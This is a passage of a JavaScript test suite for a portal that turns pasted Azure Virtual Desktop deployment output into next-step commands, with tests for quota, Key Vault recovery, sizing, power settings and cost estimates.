// Tests for the deployment portal engine (site/portal/portal-core.js) against real Cloud Shell
// output (fixtures/real-*.txt, redacted) and the scripts' state lines (fixtures/state-*.txt).
// Run: node --test build/tests/portal
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const P = require('../../../site/portal/portal-core.js');
const fixture = (name) => readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8');
const analyze = (name, cfg = {}, opts = {}) => P.analyze(fixture(name), cfg, opts);
const last = (cmd) => cmd.trim().split('\n').pop();

// Every command must work in a fresh Cloud Shell session (build/lessons/0015).
function assertSelfContained(r) {
  for (const a of r.actions.filter((x) => x.command && /scripts\//.test(x.command))) {
    assert.match(a.command, /git clone https:\/\/github\.com\/avd-ops\/avd-landing-zone\.git ~\/avd-landing-zone/, a.title);
    assert.match(a.command, /Set-Location ~\/avd-landing-zone/, a.title);
  }
}

test('real: pre-deployment not ready in check mode -> rerun with -Fix', () => {
  const r = analyze('real-predeploy-notready.txt');
  assert.equal(r.stage, 'predeploy');
  assert.equal(r.status, 'notready');
  assert.equal(r.source, 'text');
  assert.ok(r.failures.length >= 5);
  assert.match(last(r.actions[0].command), /-PreDeployment -ParameterFile parameters\/dev\.bicepparam -Location northcentralus .* -Fix$/);
  assertSelfContained(r);
});

test('real: pre-deployment ready -> deploy with the printed parameters', () => {
  const r = analyze('real-predeploy-ready.txt', { location: 'eastus2' });
  assert.equal(r.status, 'ready');
  assert.equal(r.step, 'deploy');
  assert.equal(last(r.actions[0].command), "bash ./scripts/deploy/deploy.sh -p parameters/dev.bicepparam -l northcentralus --users-group 'AVD Users' --admins-group 'AVD Admins'");
  assertSelfContained(r);
});

test('real: deployment failed on availability zones -> known cause, update and redeploy', () => {
  const r = analyze('real-deploy-failed-zones.txt');
  assert.equal(r.stage, 'deploy');
  assert.equal(r.status, 'failed');
  assert.match(r.actions[0].title, /LocationNotSupportAvailabilityZones/);
  assert.match(r.actions[0].command, /git pull/);
  assert.match(last(r.actions[0].command), /^bash \.\/scripts\/deploy\/deploy\.sh/);
});

test('real: deployment succeeded (older deploy.sh) -> post-deployment setup with -Fix', () => {
  const r = analyze('real-deploy-succeeded-old.txt');
  assert.equal(r.status, 'succeeded');
  assert.equal(r.step, 'postdeploy');
  assert.equal(last(r.actions[0].command), './scripts/ops/Test-AvdLandingZoneReadiness.ps1 -NamePrefix avdlz -Environment dev -Fix -AllowHostStart');
});

test('real: post-deployment still failing after -Fix -> show the finding, then check again', () => {
  const r = analyze('real-postdeploy-notready-fixmode.txt');
  assert.equal(r.stage, 'postdeploy');
  assert.equal(r.status, 'notready');
  assert.match(r.actions[0].title, /Profile share root ACL/);
  assert.match(r.actions[0].why, /MissingRequiredHeader/);
  assert.equal(last(r.actions.at(-1).command), './scripts/ops/Test-AvdLandingZoneReadiness.ps1 -NamePrefix avdlz -Environment dev');
});

test('real: post-deployment ready -> sign in', () => {
  const r = analyze('real-postdeploy-ready.txt');
  assert.equal(r.status, 'ready');
  assert.equal(r.step, 'signin');
  assert.match(r.actions[0].why, /windows\.cloud\.microsoft/);
});

test('real: script not found in a fresh session -> repeat the pasted command from the repo folder', () => {
  // The tracker says "sign in", but the paste shows the post-deployment preflight failed to start.
  const r = analyze('real-not-in-repo.txt', {}, { currentStep: 'signin' });
  assert.equal(r.step, 'postdeploy');
  assert.equal(r.problems[0].id, 'not-in-repo');
  assert.match(last(r.actions[0].command), /-NamePrefix avdlz -Environment dev -Fix -AllowHostStart$/);
  assertSelfContained(r);
});

test('real: stray parameter from a bad paste -> named and the step repeated', () => {
  const r = analyze('real-bad-parameter.txt', {}, { currentStep: 'postdeploy' });
  assert.equal(r.problems[0].id, 'bad-parameter');
  assert.match(r.actions[0].title, /'FixC'/);
  // The pasted command was the pre-deployment preflight; -FixC is not -Fix, so it reruns in check mode.
  assert.match(last(r.actions[0].command), /-PreDeployment .* -AdminsGroup 'AVD Admins'$/);
});

test('real: Graph token failure -> sign out of Graph and repeat', () => {
  const r = analyze('real-graph-token.txt', {}, { currentStep: 'predeploy' });
  assert.ok(r.problems.some((p) => p.id === 'graph-token'));
  const a = r.actions.find((x) => /Graph sign-in/.test(x.title));
  assert.match(a.command, /^Disconnect-MgGraph/);
});

test('state: pre-deployment not ready (fixable) -> -Fix', () => {
  const r = analyze('state-predeploy-notready-check.txt');
  assert.equal(r.source, 'state');
  assert.equal(r.status, 'notready');
  assert.match(last(r.actions[0].command), / -Fix$/);
  assert.equal(r.actions.length, 1);
});

test('state: quota and soft-deleted vault -> quota request with the right numbers, vault advice, rerun', () => {
  const r = analyze('state-predeploy-quota-kv.txt');
  const q = r.actions.find((a) => /quota/i.test(a.title));
  // limit 10, used 4, 16 needed -> request 20
  assert.match(q.command, /value = 20 }; name = @\{ value = 'standardDASv5Family' \}/);
  assert.match(q.command, /Microsoft\.Compute\/locations\/northcentralus\/providers\/Microsoft\.Quota\/quotas\/standardDASv5Family\?api-version=2023-02-01/);
  const fix = r.actions.find((a) => /with -Fix/.test(a.title));
  assert.match(fix.why, /recovers the deleted Key Vault \(kvavdlzprodabc123\)/);
  assert.match(last(fix.command), /-ParameterFile parameters\/prod\.bicepparam.* -Fix$/);
  assert.ok(!r.actions.some((a) => /Resolve the soft-deleted/.test(a.title)));
});

test('state: soft-deleted vault in check mode -> -Fix recovers it (same prefix)', () => {
  const r = analyze('state-predeploy-kv-fix.txt');
  assert.equal(r.step, 'predeploy');
  const fix = r.actions.find((a) => /with -Fix/.test(a.title));
  assert.match(fix.why, /kvavdlzprodabc123/);
  assert.match(last(fix.command), / -Fix$/);
});

test('state: -Fix recovered the vault -> deploy', () => {
  const r = analyze('state-predeploy-kv-recovered.txt');
  assert.equal(r.status, 'ready');
  assert.equal(r.step, 'deploy');
});

test('state: recovery failed under -Fix -> the script\'s detail, no -Fix loop', () => {
  const failed = { v: 1, stage: 'predeploy', status: 'notready', fix: true, context: { parameterFile: 'parameters/dev.bicepparam' }, counts: { fail: 1 },
    failures: [{ id: 'kv-softdeleted', check: 'No soft-deleted Key Vault blocking the vault name', detail: 'Recovering kvavdlzdevx into rg-avdlz-dev-management failed: ARM PUT ... (403)', remediation: 'Recover it with Undo-AzKeyVaultRemoval, or change namePrefix.', data: { vaults: ['kvavdlzdevx'] } }], warnings: [] };
  const r = P.analyze('<<<AVDLZ-STATE ' + JSON.stringify(failed) + ' AVDLZ-STATE>>>', {});
  assert.ok(!r.actions.some((a) => /with -Fix/.test(a.title)));
  assert.match(r.actions.find((a) => /Resolve the soft-deleted/.test(a.title)).why, /failed: ARM PUT .*Undo-AzKeyVaultRemoval/);
});

test('state: a line broken by the terminal copy still parses', () => {
  const r = analyze('state-wrapped-by-terminal.txt');
  assert.equal(r.source, 'state');
  assert.ok(r.actions.some((a) => /quota/i.test(a.title)));
});

test('state: pre-deployment ready -> deploy', () => {
  const r = analyze('state-predeploy-ready.txt');
  assert.equal(r.step, 'deploy');
  assert.match(last(r.actions[0].command), /^bash \.\/scripts\/deploy\/deploy\.sh -p parameters\/dev\.bicepparam -l northcentralus/);
});

test('state: deployment started but output ends (disconnect) -> status check, not a second deployment', () => {
  const r = analyze('state-deploy-started-disconnected.txt');
  assert.equal(r.status, 'started');
  assert.match(r.actions[0].command, /az deployment sub show -n \$name/);
  assert.doesNotMatch(r.actions[0].command, /deploy\.sh/);
  assert.match(r.actions[0].why, /Do not start the deployment again/);
});

test('state: deployment failed -> the last state wins over "started"', () => {
  const r = analyze('state-deploy-failed.txt');
  assert.equal(r.status, 'failed');
});

test('state: deployment succeeded -> post-deployment setup for the deployed prefix', () => {
  const r = analyze('state-deploy-succeeded.txt', { namePrefix: 'other', environment: 'prod' });
  assert.equal(last(r.actions[0].command), './scripts/ops/Test-AvdLandingZoneReadiness.ps1 -NamePrefix avdlz -Environment dev -Fix -AllowHostStart');
});

test('state: post-deployment not ready in check mode -> -Fix -AllowHostStart', () => {
  const r = analyze('state-postdeploy-notready-check.txt');
  assert.match(last(r.actions[0].command), /-Fix -AllowHostStart$/);
});

test('state: no landing zone under this name -> check the one that exists', () => {
  const r = analyze('state-postdeploy-no-lz.txt');
  assert.match(last(r.actions[0].command), /-NamePrefix contoso -Environment prod$/);
});

test('state: post-deployment ready -> sign in, demo optional', () => {
  const r = analyze('state-postdeploy-ready.txt');
  assert.equal(r.step, 'signin');
  assert.match(last(r.actions[1].command), /^\.\/scripts\/ops\/Deploy-AvdDemo\.ps1 -NamePrefix avdlz -Environment dev$/);
});

test('state: demo ready -> sign in, then remove the demo', () => {
  const r = analyze('state-demo-ready.txt');
  assert.match(r.actions[0].why, /vdws-avdlz-dev-demo/);
  assert.match(last(r.actions[1].command), /Remove-AvdDemo\.ps1/);
});

test('state: landing zone removed -> done, pre-deployment to start again', () => {
  const r = analyze('state-cleanup-lz.txt');
  assert.equal(r.status, 'done');
  assert.match(r.actions[0].title, /landing zone is removed/);
});

test('state: demo cleanup whose Graph sign-in timed out -> run it again to finish the devices (lesson 0029)', () => {
  const r = analyze('state-cleanup-devices-left.txt');
  assert.equal(r.actions[0].title, 'Finish the device cleanup');
  assert.match(r.actions[0].why, /avdlzddemo-001/);
  assert.match(r.actions[0].why, /devicelogin/);
  assert.equal(last(r.actions[0].command), './scripts/ops/Remove-AvdDemo.ps1 -NamePrefix avdlz -Environment dev');
  assertSelfContained(r);
});

test('host pool region not offered -> closest supported region from the latency test', () => {
  const state = { v: 1, stage: 'predeploy', status: 'notready', fix: false, context: { location: 'mexicocentral', parameterFile: 'parameters/dev.bicepparam' },
    failures: [{ id: 'hostpool-region', check: 'AVD host pools offered in mexicocentral', data: { location: 'mexicocentral', regions: ['eastus2', 'southcentralus', 'westus2'] } }], warnings: [] };
  const text = `<<<AVDLZ-STATE ${JSON.stringify(state)} AVDLZ-STATE>>>`;
  const r = P.analyze(text, {}, { rankedRegions: ['mexicocentral', 'southcentralus', 'eastus2'] });
  assert.match(last(r.actions[0].command), /-Location southcentralus /);
  assert.equal(r.actions.length, 1, 'no extra rerun in the old region');
});

test('nothing recognizable -> ask for the whole output', () => {
  const r = P.analyze('hello world');
  assert.equal(r.recognized, false);
  assert.match(r.actions[0].why, /AVDLZ-STATE/);
});

test('group names with apostrophes are quoted for PowerShell', () => {
  assert.equal(P.psQuote("O'Brien Users"), "'O''Brien Users'");
  const c = P.commands.deploy({ ...P.DEFAULTS, usersGroup: "O'Brien Users" });
  assert.match(c, /--users-group 'O''Brien Users'/);
});

test('the first step for a new user is the pre-deployment preflight in the chosen region', () => {
  const s = P.firstStep({ location: 'westus2', parameterFile: 'parameters/prod.bicepparam' });
  assert.match(last(s.command), /-PreDeployment -ParameterFile parameters\/prod\.bicepparam -Location westus2 /);
});

test('every step has a default action, and commands in it are self-contained', () => {
  for (const s of P.STEPS) {
    const actions = P.actionsForStep(s.id, { location: 'westus2' });
    assert.ok(actions.length > 0, s.id);
    assertSelfContained({ actions });
  }
  assert.match(last(P.actionsForStep('deploy', { location: 'westus2' })[0].command), / -l westus2 /);
});

// Drift guard: every parameter the portal puts in a command exists in the script it calls.
test('portal commands only use parameters the scripts define', () => {
  const repo = new URL('../../../', import.meta.url);
  const psParams = (file) => {
    const src = readFileSync(new URL(file, repo), 'utf8');
    const block = src.slice(src.indexOf('param('), src.indexOf('\n)', src.indexOf('param(')));
    return new Set([...block.matchAll(/\]\s*\$(\w+)/g)].map((m) => m[1].toLowerCase()));
  };
  const shFlags = new Set([...readFileSync(new URL('scripts/deploy/deploy.sh', repo), 'utf8').matchAll(/^\s*(-{1,2}[a-z-]+)\)/gm)].map((m) => m[1]));
  const scripts = {
    'Test-AvdLandingZoneReadiness.ps1': psParams('scripts/ops/Test-AvdLandingZoneReadiness.ps1'),
    'Deploy-AvdDemo.ps1': psParams('scripts/ops/Deploy-AvdDemo.ps1'),
    'Remove-AvdDemo.ps1': psParams('scripts/ops/Remove-AvdDemo.ps1'),
    'Invoke-AvdPowerAction.ps1': psParams('scripts/automation/Invoke-AvdPowerAction.ps1'),
    'Test-AvdUserConnection.ps1': psParams('scripts/ops/Test-AvdUserConnection.ps1'),
    'Connect-AvdLandingZone.ps1': psParams('scripts/ops/Connect-AvdLandingZone.ps1'),
    'Get-AvdRunStatus.ps1': psParams('scripts/ops/Get-AvdRunStatus.ps1'),
    'Start-AvdRunRecorder.ps1': psParams('scripts/ops/Start-AvdRunRecorder.ps1'),
    'Stop-AvdRunRecorder.ps1': psParams('scripts/ops/Stop-AvdRunRecorder.ps1')
  };
  const cfg = { ...P.DEFAULTS, testUserUpn: 'alex@contoso.com' };
  const commands = [
    P.commands.predeploy(cfg, true), P.commands.predeploy(cfg, false), P.commands.postdeploy(cfg, true), P.commands.postdeploy(cfg, false),
    P.commands.demo(cfg), P.commands.removeDemo(cfg), P.commands.deploy(cfg), P.commands.wellArchitected(cfg)
  ];
  // The same commands once a sizing is set.
  const sizedCfg = { ...cfg, sizing: P.toSizing(P.computePool({ users: 120, workload: 'heavy', vmSize: '', hostCount: 'auto' }, 'prod')) };
  commands.push(P.commands.predeploy(sizedCfg, true), P.commands.deploy(sizedCfg), P.commands.postdeploy(sizedCfg, true));
  commands.push(P.commands.power(cfg, 'Resume'), P.commands.power(cfg, 'Lock'));
  commands.push(P.commands.verify(cfg), P.commands.verify(cfg, { user: 'alex@contoso.com', demo: true, timeout: 30 }));
  commands.push(P.commands.demo({ ...cfg, graphClientId: '11111111-2222-3333-4444-555555555555' }));
  let checked = 0;
  // The Graph sign-in line runs before the script (decision 0016); check its parameters too.
  // The run recorder's blocks, sized and in both modes, and Where did I leave off.
  const rec = { runId: 'run-20261021-0517-ab12', mode: 'azure' };
  for (const c of [{ ...cfg, record: rec }, { ...sizedCfg, record: { ...rec, mode: 'on' } }]) {
    commands.push(P.commands.runStatus(c), ...P.recordActions(c).map((a) => a.command));
  }
  const lines = commands.flatMap((c) => c.trim().split('\n').filter((l) => Object.keys(scripts).some((s) => l.includes(s))));
  for (const line of lines) {
    const script = Object.keys(scripts).find((s) => line.includes(s));
    if (script) {
      for (const [, p] of line.matchAll(/\s-([A-Za-z]+)\b/g)) { assert.ok(scripts[script].has(p.toLowerCase()), `${script} has no -${p}`); checked++; }
    }
    else if (line.includes('deploy.sh')) {
      for (const [, f] of line.matchAll(/\s(-{1,2}[a-z-]+)\s/g)) { assert.ok(shFlags.has(f), `deploy.sh has no ${f}`); checked++; }
    }
  }
  assert.ok(checked >= 30, `checked ${checked} parameters`);
});

test('state: post-deployment ready -> offers the Well-Architected review', () => {
  const r = analyze('state-postdeploy-ready.txt');
  const w = r.actions.find((a) => /Well-Architected/.test(a.title));
  assert.ok(w, 'no Well-Architected action');
  assert.equal(last(w.command), './scripts/ops/Test-AvdLandingZoneReadiness.ps1 -NamePrefix avdlz -Environment dev -WellArchitected -SkipTenant -SkipNtfs');
  assertSelfContained(r);
});

test('state: Well-Architected review of a dev landing zone -> findings by pillar, expected ones counted, sign-in not blocked', () => {
  const r = analyze('state-postdeploy-waf.txt');
  assert.equal(r.status, 'ready');
  assert.equal(r.step, 'signin');
  assert.equal(r.actions[0].title, 'Review the Well-Architected findings');
  assert.match(r.actions[0].why, /^To review: /);
  assert.match(r.actions[0].why, /7 are trade-offs the dev parameter file makes on purpose/);
  assert.ok(r.warnings.some((w) => w.id === 'waf-zones' && w.data.accepted));
  assert.ok(r.actions.some((a) => a.title === 'Sign in to the desktop'));
  assert.ok(!r.actions.some((a) => a.title === 'Optional: Well-Architected review'), 'offers the review it just ran');
});

test('state: Well-Architected review with nothing to review', () => {
  const r = analyze('state-postdeploy-waf-clean.txt');
  assert.equal(r.actions[0].title, 'Well-Architected: every check passes');
  assert.equal(r.warnings.length, 0);
});

test('real: first live Well-Architected review (dev, northcentralus) -> sign-in, 4 open findings, 6 expected', () => {
  const r = analyze('real-postdeploy-waf.txt');
  assert.equal(r.source, 'state');
  assert.equal(r.status, 'ready');
  assert.equal(r.step, 'signin');
  assert.equal(r.actions[0].title, 'Review the Well-Architected findings');
  assert.equal(r.actions[0].why.split('.')[0], 'To review: 1 Reliability, 1 Security, 2 Operational Excellence');
  assert.match(r.actions[0].why, /6 are trade-offs the dev parameter file makes on purpose/);
});

// ---------------------------------------------------------------- sizing and cost (decision 0010)
test('sizing (automatic): users, concurrency and workload -> hosts, sessions per host, quota and profile share', () => {
  const r = P.computePool({ users: 50, concurrencyPercent: 80, workload: 'medium', vmSize: '', hostCount: 'auto', profileGiBPerUser: 10 }, 'dev');
  assert.equal(r.concurrentUsers, 40);
  assert.equal(r.vmSize, 'Standard_E8as_v5');          // suggested for medium: memory-optimized
  assert.equal(r.memoryPerSessionGiB, 2);              // 64 GiB for 32 sessions
  assert.equal(r.osDisk, 'Premium SSD (P10, 128 GiB)');
  assert.equal(r.sessionsPerHost, 32);                 // 8 vCPU x 4 per vCPU
  assert.equal(r.hosts, 2);
  assert.equal(r.vcpus, 16);
  assert.equal(r.profileQuotaGiB, 600);                // 50 x 10 GiB + 20%, rounded up to 100s
  assert.deepEqual(r.notes, []);
});

test('sizing: prod adds a spare host by default and never goes below two; small shares are 100 GiB', () => {
  assert.equal(P.computePool({ users: 20, workload: 'light', vmSize: 'Standard_D4as_v5', hostCount: 'auto' }, 'prod').hosts, 2);   // 16 of 24 -> 1 + spare
  assert.equal(P.computePool({ users: 20, workload: 'light', vmSize: 'Standard_D4as_v5', spareHost: false, hostCount: 'auto' }, 'prod').hosts, 2); // minimum two
  assert.equal(P.computePool({ users: 20, workload: 'light', vmSize: 'Standard_D4as_v5', hostCount: 'auto' }, 'dev').hosts, 1);
  assert.equal(P.computePool({ users: 20, workload: 'light', vmSize: 'Standard_D4as_v5', spareHost: true, hostCount: 'auto' }, 'dev').hosts, 2);
  assert.equal(P.computePool({ users: 5, profileGiBPerUser: 5 }, 'dev').profileQuotaGiB, 100);
});

test('sizing: suggests E-series for every workload, and flags too little memory per session', () => {
  for (const w of Object.keys(P.WORKLOADS)) assert.match(P.computePool({ workload: w, vmSize: '' }, 'dev').vmSize, /^Standard_E/, w);
  // D-series at Microsoft's medium density: 1 GiB per session -> suggest the E-series equivalent.
  assert.match(P.computePool({ users: 30, workload: 'medium', vmSize: 'Standard_D8as_v5' }, 'dev').notes.join(' '), /Standard_E8as_v5 has twice the memory/);
  // E-series at light density (1.3 GiB per session) is fine; below 1 GiB on any size is not.
  assert.deepEqual(P.computePool({ users: 30, workload: 'light', vmSize: 'Standard_E4as_v5', hostCount: 'auto' }, 'dev').notes, []);
  assert.match(P.computePool({ users: 30, workload: 'light', vmSize: 'Standard_D16as_v5' }, 'dev').notes.join(' '), /Standard_E16as_v5/);
});

test('sizing: defaults to the minimum viable kit, the same as the dev parameter file', () => {
  const r = P.computePool({}, 'dev');
  assert.equal(r.hosts, 1);
  assert.equal(r.hostCountAuto, false);
  assert.equal(r.vmSize, 'Standard_E4as_v5');
  assert.equal(r.profileQuotaGiB, 100);
  assert.equal(r.sessionsPerHost, 16);                 // 4 vCPU x 4 per vCPU (medium)
  assert.match(r.notes.join(' '), /One host: no redundancy/);
  const dev = readFileSync(new URL('../../../parameters/dev.bicepparam', import.meta.url), 'utf8');
  assert.match(dev, /AVD_SESSION_HOST_COUNT', ''\)\) \? 1 :/);
  assert.match(dev, /AVD_SESSION_HOST_VM_SIZE', ''\)\) \? 'Standard_E4as_v5' :/);
  assert.match(dev, /AVD_PROFILE_QUOTA_GIB', ''\)\) \? 100 :/);
});

test('sizing: a chosen host count is kept, even in prod, and says when it is short', () => {
  const r = P.computePool({ users: 100, hostCount: 3 }, 'prod');
  assert.equal(r.hosts, 3);                             // no spare or minimum added to a chosen count
  assert.equal(r.capacity, 48);
  assert.match(r.notes.join(' '), /3 hosts carry 48 sessions, but 80 people are expected/);
  assert.match(P.computePool({ hostCount: 1 }, 'prod').notes.join(' '), /flags one host in prod/);
  assert.equal(P.computePool({ hostCount: 500 }, 'dev').hosts, P.MAX_HOSTS);
  assert.equal(P.computePool({ hostCount: '4' }, 'dev').hosts, 4);   // from a <select>
  assert.deepEqual(P.computePool({ users: 20, hostCount: 2 }, 'dev').notes, []);
});

test('sizing: falls back from an unknown size to the suggested one', () => {
  const r = P.computePool({ users: 30, workload: 'heavy', vmSize: 'Standard_X99' }, 'dev');
  assert.equal(r.vmSize, 'Standard_E8as_v5');
  assert.match(r.notes[0], /Unknown size/);
});

test('sizing: every size and workload the portal offers is well formed; one host pool for now', () => {
  for (const [k, v] of Object.entries(P.VM_SIZES)) { assert.match(k, /^Standard_[A-Za-z0-9_]+$/); assert.ok(v.vcpu > 0 && v.ramGiB > 0, k); }
  for (const w of Object.values(P.WORKLOADS)) assert.ok(P.VM_SIZES[w.suggestedSize], w.suggestedSize);
  assert.equal(P.MAX_HOST_POOLS, 1);
});

test('sizing: commands carry it only once it is set', () => {
  const plain = { ...P.DEFAULTS };
  assert.doesNotMatch(P.commands.predeploy(plain, false), /-SessionHostCount/);
  const cfg = { ...P.DEFAULTS, sizing: P.toSizing(P.computePool({ users: 50, vmSize: '', hostCount: 'auto', profileGiBPerUser: 10 }, 'dev')) };
  assert.match(last(P.commands.predeploy(cfg, true)), / -SessionHostCount 2 -SessionHostVmSize Standard_E8as_v5 -MaxSessionLimit 32 -ProfileShareQuotaGiB 600 -ActiveHoursPerWeek 50 -Fix$/);
  assert.match(last(P.commands.deploy(cfg)), / --hosts 2 --vm-size Standard_E8as_v5 --max-sessions 32 --profile-quota 600$/);
  assert.match(last(P.commands.postdeploy(cfg, false)), / -SessionHostVmSize Standard_E8as_v5 -SessionHostCount 2$/);
});

test('state: sized preflight short of quota -> quota request for the sized hosts, rerun keeps the sizing, estimate shown', () => {
  const r = analyze('state-predeploy-sized-quota.txt');
  assert.equal(r.status, 'notready');
  assert.equal(r.sizing.hosts, 3);
  assert.equal(r.estimate.total, 862.4);
  assert.equal(r.estimate.unpriced[0].key, 'publicip');
  const quota = r.actions.find((a) => /quota/i.test(a.title));
  assert.ok(quota, 'no quota action');
  assert.match(quota.command, /needed 24/);
  const rerun = r.actions.at(-1);
  assert.match(last(rerun.command), / -SessionHostCount 3 -SessionHostVmSize Standard_D8as_v5 -MaxSessionLimit 60 -ProfileShareQuotaGiB 600 -ActiveHoursPerWeek 60$/);
});

test('state: sized preflight ready -> deploy with the validated sizing', () => {
  const r = analyze('state-predeploy-sized-ready.txt', { sizing: { hosts: 9, vmSize: 'Standard_D4as_v5', maxSessions: 4, profileQuotaGiB: 100 } });
  assert.equal(r.step, 'deploy');
  assert.equal(last(r.actions[0].command), "bash ./scripts/deploy/deploy.sh -p parameters/dev.bicepparam -l northcentralus --users-group 'AVD Users' --admins-group 'AVD Admins' --hosts 3 --vm-size Standard_D8as_v5 --max-sessions 32 --profile-quota 600");
  assert.equal(r.estimate.unpriced.length, 0);
  assertSelfContained(r);
});

// ---------------------------------------------------------------- Security Defaults (a warning, never a blocker)
test('state: pre-deployment ready with Security Defaults on -> decide about it, then deploy', () => {
  const r = analyze('state-predeploy-security-defaults.txt');
  assert.equal(r.status, 'ready');
  assert.equal(r.step, 'deploy');
  assert.equal(r.actions[0].title, 'Decide about Security Defaults before the post-deployment setup');
  assert.equal(r.actions[0].command, '');
  assert.match(r.actions[1].why, /^The pre-deployment preflight passed\./);
  assertSelfContained(r);
});

test('state: post-deployment ready with Security Defaults on -> still sign in, with the warning first', () => {
  const r = analyze('state-postdeploy-security-defaults.txt');
  assert.equal(r.status, 'ready');
  assert.equal(r.step, 'signin');
  assert.equal(r.actions[0].title, 'Decide about Security Defaults if profiles fail to load');
  assert.equal(r.actions[0].command, '');
  assert.equal(r.actions[1].title, 'Sign in to the desktop');
  assert.doesNotMatch(r.actions[1].why, /Everything checks out/);
});

test('state: ready without Security Defaults -> no Security Defaults step', () => {
  assert.ok(!analyze('state-predeploy-ready.txt').actions.some((x) => /Security Defaults/.test(x.title)));
  assert.ok(!analyze('state-postdeploy-ready.txt').actions.some((x) => /Security Defaults/.test(x.title)));
});

test('state: profile share allows only AES-256-GCM -> deploy again, not -Fix (lesson 0028)', () => {
  const r = analyze('state-postdeploy-smb-channel.txt');
  assert.equal(r.status, 'notready');
  assert.equal(r.actions[0].title, 'Deploy the landing zone again');
  assert.match(r.actions[0].why, /AES-256-GCM/);
  assert.match(last(r.actions[0].command), /^bash \.\/scripts\/deploy\/deploy\.sh -p parameters\/dev\.bicepparam /);
  assert.ok(!r.actions.some((a) => /^Fix: Profile share/.test(a.title)), 'the failure is not repeated as a generic step');
  assert.ok(!r.actions.some((a) => /-Fix/.test(a.command || '')), '-Fix does not change SMB settings');
  assertSelfContained(r);
});

// ---------------------------------------------------------------- auto shutdown (decision 0011)
test('state: auto shutdown locked the hosts -> resume command', () => {
  const r = analyze('state-power-locked.txt');
  assert.equal(r.stage, 'power');
  assert.equal(r.status, 'locked');
  assert.match(r.headline, /^Auto shutdown: Locked/);
  assert.equal(last(r.actions[0].command), './scripts/automation/Invoke-AvdPowerAction.ps1 -Action Resume -NamePrefix avdlz -Environment dev');
  assertSelfContained(r);
});

test('state: post-deployment check on locked hosts -> resume first, then sign in', () => {
  const r = analyze('state-postdeploy-locked.txt');
  assert.equal(r.status, 'ready');
  assert.equal(r.actions[0].title, 'Resume the session hosts');
  assert.match(r.actions[0].why, /budget/);
  assert.match(last(r.actions[0].command), /Invoke-AvdPowerAction\.ps1 -Action Resume -NamePrefix avdlz -Environment dev$/);
  assert.ok(r.actions.some((a) => a.title === 'Sign in to the desktop'));
});

test('page: one slide per step, in order, and the latency check comes first', () => {
  const html = readFileSync(new URL('../../../site/portal/index.html', import.meta.url), 'utf8');
  const slides = [...html.matchAll(/<section class="slide"[^>]*data-step="([a-z]+)"/g)].map((m) => m[1]);
  assert.deepEqual(slides, P.STEPS.map((s) => s.id));
  assert.equal(P.STEPS[0].id, 'region');
  const region = html.slice(html.indexOf('data-step="region"'), html.indexOf('data-step="size"'));
  assert.match(region, /id="run"/, 'the latency test is in the first step');
});

test('page: Deployment settings opens from a link in the header, above the steps', () => {
  const html = readFileSync(new URL('../../../site/portal/index.html', import.meta.url), 'utf8');
  const header = html.slice(html.indexOf('<header'), html.indexOf('</header>'));
  assert.match(header, /id="settings-link"[^>]*aria-controls="settings-panel"/);
  assert.ok(html.indexOf('id="settings-panel"') < html.indexOf('id="steps"'), 'settings panel sits under the header');
  assert.ok(html.indexOf('id="settings-panel"') < html.indexOf('id="report-panel"'));
});

// ---------------------------------------------------------------- cost step: power settings (decision 0010, 0011)
test('cost: hours per host from the hours people work and the two power settings', () => {
  const on = { startVmOnConnect: true, autoShutdownTime: '20:00' };
  assert.equal(P.hostHours(50, on).hoursPerWeek, 50);                                               // start on demand, stop at 20:00
  assert.equal(P.hostHours(50, { ...on, startVmOnConnect: false }).hoursPerWeek, 65);              // 07:00-20:00 on weekdays
  assert.equal(P.hostHours(70, { ...on, startVmOnConnect: false }).hoursPerWeek, 70);              // never below the hours people work
  assert.equal(P.hostHours(50, { ...on, autoShutdownTime: 'none' }).hoursPerWeek, 168);            // nothing stops them
  assert.match(P.hostHours(50, { startVmOnConnect: false, autoShutdownTime: '18:00' }).basis, /07:00 on weekdays .* 18:00 \(55 h a week\)/);
});

test('cost: power defaults follow the parameter file (dev stops at 20:00, prod has no scheduled stop)', () => {
  assert.deepEqual(P.effectivePower({ parameterFile: 'parameters/dev.bicepparam' }), { startVmOnConnect: true, autoShutdownTime: '20:00', fromFile: true });
  assert.deepEqual(P.effectivePower({ parameterFile: 'parameters/prod.bicepparam' }), { startVmOnConnect: true, autoShutdownTime: 'none', fromFile: true });
  assert.equal(P.effectivePower({ parameterFile: 'parameters/dev.bicepparam', power: { startVmOnConnect: false, autoShutdownTime: '18:30' } }).fromFile, false);
});

test('cost: commands carry the power settings once chosen, and price the hours they imply', () => {
  const plain = { ...P.DEFAULTS };
  assert.doesNotMatch(P.commands.predeploy(plain, false), /AutoShutdownTime|ActiveHoursPerWeek/);
  assert.doesNotMatch(P.commands.deploy(plain), /--auto-shutdown/);
  const cfg = { ...P.DEFAULTS, power: { startVmOnConnect: false, autoShutdownTime: 'none' }, hoursWorkedPerWeek: 45 };
  assert.match(last(P.commands.predeploy(cfg, false)), / -AutoShutdownTime none -StartVmOnConnect false -ActiveHoursPerWeek 168$/);
  assert.match(last(P.commands.deploy(cfg)), / --auto-shutdown none --start-vm-on-connect false$/);
  const back = { ...cfg, power: { startVmOnConnect: true, autoShutdownTime: '19:00' }, sizing: { hosts: 2, vmSize: 'Standard_E4as_v5', maxSessions: 16, profileQuotaGiB: 100, activeHoursPerWeek: 168 } };
  // Turning the settings back on prices the hours people work again, not the 168 a pasted preflight reported.
  assert.match(last(P.commands.predeploy(back, false)), / -SessionHostCount 2 .* -AutoShutdownTime 19:00 -StartVmOnConnect true -ActiveHoursPerWeek 45$/);
});

test('cost: a preflight estimate is repriced for the hours, hosts and profile share; not across sizes or regions', () => {
  const est = analyze('state-predeploy-sized-ready.txt').estimate;   // 3 x D8as_v5, 60 h/week, northcentralus
  const sizing = { hosts: 3, vmSize: 'Standard_D8as_v5', profileQuotaGiB: 600 };
  const same = P.repriceEstimate(est, sizing, 60, 'northcentralus');
  assert.deepEqual(same.stale, []);
  assert.equal(same.total, est.total);                               // same inputs, same total
  const always = P.repriceEstimate(est, sizing, 168, 'northcentralus');
  assert.equal(always.total, same.alwaysOnTotal);
  assert.ok(always.total > same.total);
  const twoHosts = P.repriceEstimate(est, { ...sizing, hosts: 2 }, 60, 'northcentralus');
  assert.match(twoHosts.lines.find((l) => l.key === 'osdisk').item, /\(2 x/);
  assert.ok(twoHosts.total < same.total);
